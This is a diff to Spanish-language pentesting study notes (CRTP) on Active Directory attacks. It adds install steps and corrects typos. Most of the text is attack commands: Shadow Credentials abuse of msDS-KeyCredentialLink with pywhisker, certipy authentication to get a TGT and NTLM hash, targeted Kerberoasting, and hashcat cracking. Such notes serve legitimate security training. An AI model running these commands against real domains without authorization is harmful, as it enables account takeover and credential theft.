@@ -1,6 +1,6 @@
 # Shadow Credentials Attack 
 
-Tags: #CRTP #Kali #GenericWrite #msDS-KeyCredentialLink
+Tags: #CRTP #Kali #GenericWrite #msDS-KeyCredentialLink #Pywhisker #Certipy 
 
 Objeto: 
 	- usuarios --> fpena
@@ -26,13 +26,24 @@ Ataque:
 * [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
 * [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
 
+```bash 
+# Instalación 
+❯ git clone https://github.com/ShutdownRepo/pywhisker.git
+❯ cd pywhisker
+❯ python3 -m venv env
+❯ source env/bin/activate
+❯ pip install --upgrade pip
+❯ pip install -r requirements.txt
+❯ cd pywhisker
+```
+
 ```bash
 # Shadow credentials attack 
 ❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action list 
-# Listar el aatributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'
+# Listar el atributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'
 
 ❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action "add" 
-# La tool crea una llave privadaa, una pública y lo añade al usuario víctima 
+# La tool crea una llave privada, una pública y lo añade al usuario víctima 
 
 	# dc-ip = IP del DC
 	# d = Dominio 
@@ -46,6 +57,8 @@ Notas:
 ```
 
 ```bash 
+# CERTIPY AUTH (funciona si PKINIT está habilitado)
+
 # Autenticarse en el dominio generando el TGT y el NTLM HASH 
 ❯ certipy-ad auth -pfx cert.pfx -password 'pass123' -username targetAccount -domain domain.com -dc-ip IP
 	# pfx = Es el certificado que crea el comando anterior 
@@ -66,6 +79,19 @@ Ataques:
 
 * [TargetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
 
+```bash 
+# Instalación
+❯ git clone https://github.com/ShutdownRepo/targetedKerberoast.git
+❯ cd targetedKerberoast
+❯ python3 -m venv env
+❯ source env/bin/activate
+❯ pip install --upgrade pip
+❯ pip install -r requirements.txt
+
+# IMPORTANTE
+❯ ntpdate <IP_DC>     # Sincronizar el reloj 
+```
+
 ```powershell 
 ❯ targetedKerberoast.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP
 # Esto lo hace para todos los usuarios y al usuario que encuentre con el permiso de GenericWrite le escribe temporal sobre el atributo SPN para obtener el TGT. 
@@ -75,7 +101,8 @@ Ataques:
 ```
 
 ```bash 
-❯ hashcat -m 13100 --force -a 0 --rules /usr/share/hascat/rules/InsidePro-PasswordsPro.rule kerberoasting.tgt  /usr/share/wordlists/rockyou.txt   # Crackear el hash 
+# Crackear el hash 
+❯ hashcat -m 13100 --force -a 0 --rules /usr/share/hascat/rules/InsidePro-PasswordsPro.rule kerberoasting.tgt  /usr/share/wordlists/rockyou.txt   
 
 	# kerberoasting.tgs = Contiene el TGT del comando anterior 
 ```
@@ -88,7 +115,7 @@ Ataques:
 ```bash
 # Shadow credentials attack 
 ❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action list 
-# Listar el aatributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'
+# Listar el atributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'
 
 ❯ pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --dc-ip IP --target "targetAccount" --action "add" 
 # La tool crea una llave privadaa, una pública y lo añade al usuario víctima 
@@ -105,6 +132,8 @@ Notas:
 ```
 
 ```bash 
+# CERTIPY AUTH (funciona si PKINIT está habilitado)
+
 # Autenticarse en el dominio generando el TGT y el NTLM HASH 
 ❯ certipy-ad auth -pfx cert.pfx -password 'pass123' -username targetAccount -domain domain.com -dc-ip IP
 	# pfx = Es el certificado que crea el comando anterior 
